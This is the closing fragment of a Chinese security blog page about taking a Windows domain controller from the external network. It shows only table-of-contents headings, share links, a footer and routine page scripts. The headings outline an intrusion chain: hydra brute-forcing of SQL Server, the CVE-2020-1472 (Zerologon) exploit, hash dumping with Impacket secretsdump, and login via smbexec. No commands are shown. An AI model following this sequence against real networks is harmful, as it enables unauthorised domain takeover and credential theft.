class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hydra%E7%88%86%E7%A0%B4sqlserver"><span class="toc-number">6.0.2.</span> <span class="toc-text">hydra爆破sqlserver</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#natvicat%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%BF%9E%E6%8E%A5mssql"><span class="toc-number">6.0.3.</span> <span class="toc-text">natvicat客户端连接mssql</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-2"><span class="toc-number">6.0.4.</span> <span class="toc-text">信息收集</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cve-2020-1472%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7"><span class="toc-number">6.1.</span> <span class="toc-text">cve-2020-1472拿下域控</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Impacket-secretsdump-%E8%8E%B7%E5%8F%96%E5%9F%9F%E6%8E%A7%E5%93%88%E5%B8%8C"><span class="toc-number">6.1.1.</span> <span class="toc-text">Impacket secretsdump 获取域控哈希</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87-smbexec-%E7%99%BB%E5%BD%95%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8"><span class="toc-number">6.1.2.</span> <span class="toc-text">通过 smbexec 登录域控制器</span></a></li></ol></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/&text=scaner从外网到拿下域控"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/&title=scaner从外网到拿下域控"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/&is_video=false&description=scaner从外网到拿下域控"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=scaner从外网到拿下域控&body=Check out this article: https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/&title=scaner从外网到拿下域控"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/&title=scaner从外网到拿下域控"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/&title=scaner从外网到拿下域控"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/&title=scaner从外网到拿下域控"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/&name=scaner从外网到拿下域控&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://garckz.github.io/2022/05/22/scaner%E4%BB%8E%E5%A4%96%E7%BD%91%E5%88%B0%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7/&t=scaner从外网到拿下域控"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
    <div class="footer-left">
        Copyright &copy;
        
        
        2019-2024
        Garck3h
    </div>
    <div class="footer-right">
        <nav>

            <ul>
                
                    <!-- 不蒜子统计 -->
                    <span id="busuanzi_container_site_pv">
                  本站总访问量<span id="busuanzi_value_site_pv"></span>次
              </span>

                    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
                
            </ul>


        </nav>
    </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "复制成功！");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
